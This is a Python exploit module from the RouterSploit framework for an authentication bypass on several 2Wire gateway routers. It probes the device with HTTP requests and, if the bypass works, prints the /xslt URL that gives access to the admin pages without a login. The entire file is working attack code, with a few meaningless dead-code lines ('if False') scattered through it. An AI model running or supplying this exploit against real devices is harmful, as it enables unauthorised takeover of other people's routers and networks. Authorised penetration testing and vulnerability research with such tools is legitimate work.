from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': '2Wire Gateway Auth Bypass', 'description': 'Module exploits 2Wire Gateway authentication bypass vulnerability. If the target is vulnerable link to bypass authentication is provided.', 'authors': ('bugz', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/9459/',), 'devices': ('2Wire 2701HGV-W', '2Wire 3800HGV-B', '2Wire 3801HGV')}
    target = OptIP('', 'Target IPv4, IPv6 address: 192.168.1.1')
    port = OptPort(80, 'Target HTTP port')

    def run(self):
        if False:
            return 10
        if self.check():
            print_success('Target is vulnerable')
            print_info('\nUse your browser:')
            print_info('{}:{}/xslt'.format(self.target, self.port))
        else:
            print_error('Target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        mark = '<form name="pagepost" method="post" action="/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST" id="pagepost">'
        response = self.http_request(method='GET', path='/')
        if response is None:
            return False
        if mark not in response.text:
            return False
        response = self.http_request(method='GET', path='/xslt')
        if response is None:
            return False
        if mark not in response.text:
            return True
        return False